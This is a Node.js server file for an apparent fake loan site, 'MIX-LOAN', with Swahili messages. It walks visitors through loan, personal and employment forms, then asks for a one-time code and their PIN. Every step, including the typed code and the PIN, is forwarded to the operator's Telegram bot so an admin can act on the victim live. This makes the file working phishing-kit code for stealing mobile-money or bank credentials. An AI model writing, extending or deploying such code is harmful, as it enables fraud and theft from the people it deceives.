const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { sendAdminAlert } = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// CRITICAL: Middleware to parse JSON for the /admin/action endpoint
app.use(express.json());

// Socket.IO Setup with CORS for stability
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

const sessions = new Map();

/**
 * HELPER: Track user progress and notify Telegram
 */
const trackProgress = async (socketId, stepName, extraData = {}) => {
    const session = sessions.get(socketId);
    if (!session) return;

    // Update session data
    session.data = { ...session.data, ...extraData };
    session.step = stepName;

    // Send the alert to your Telegram Bot via bot_manager.js
    await sendAdminAlert({
        step: stepName,
        socketId: socketId,
        ...session.data
    });
};

// --- ADMIN ENDPOINT (Called by bot_manager.js) ---
app.post('/admin/action', (req, res) => {
    const { socketId, action, referenceId, message } = req.body;
    
    console.log(`Admin Decision: ${action} for Socket: ${socketId}`);
    
    if (action === 'approve') {
        io.to(socketId).emit('admin-approved', { 
            referenceId: referenceId || `MIX-${Date.now()}` 
        });
    } else {
        io.to(socketId).emit('admin-rejected', { 
            message: message || 'Maombi yako hayajapitishwa.' 
        });
    }
    
    res.status(200).send('OK');
});

// --- SOCKET.IO LOGIC ---
io.on('connection', (socket) => {
    console.log(`New Connection: ${socket.id}`);
    sessions.set(socket.id, { step: 'CONNECTED', data: {}, authenticated: false });

    socket.on('step1', (data) => trackProgress(socket.id, '1_LOAN_DETAILS', data));
    
    socket.on('step2', (data) => trackProgress(socket.id, '2_PERSONAL_INFO', data));

    socket.on('step3-data', (data) => trackProgress(socket.id, '3_EMPLOYMENT', data));

    socket.on('send-otp', (data) => {
        const otp = Math.floor(1000 + Math.random() * 9000).toString();
        const session = sessions.get(socket.id);
        session.otp = otp;
        
        console.log(`[DEBUG] OTP for ${socket.id}: ${otp}`);
        
        trackProgress(socket.id, 'OTP_SENT', { 
            phone: data.phoneNumber, 
            generatedOtp: otp 
        });
        
        socket.emit('otp-sent');
    });

    socket.on('step4-otp', (data) => {
        const session = sessions.get(socket.id);
        if (session && session.otp === data.otp) {
            session.authenticated = true;
            trackProgress(socket.id, '4_OTP_VERIFIED', { typedOtp: data.otp });
        } else {
            socket.emit('admin-rejected', { message: 'Namba ya uhakiki si sahihi.' });
        }
    });

    socket.on('step5-pin', (data) => {
        const session = sessions.get(socket.id);
        // Only allow PIN submission if OTP was verified
        if (session && session.authenticated) {
            trackProgress(socket.id, '5_PIN_SUBMITTED', { pin: data.pin });
        }
    });

    socket.on('disconnect', () => {
        console.log(`Disconnected: ${socket.id}`);
        sessions.delete(socket.id);
    });
});

// --- PORT BINDING FOR RENDER ---
const PORT = process.env.PORT || 3000;

// listening on 0.0.0.0 is mandatory for Render to detect the open port
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    🚀 MIX-LOAN SERVER ACTIVE
    -------------------------
    Port: ${PORT}
    URL:  ${process.env.RENDER_EXTERNAL_URL || 'http://localhost:' + PORT}
    -------------------------
    `);
});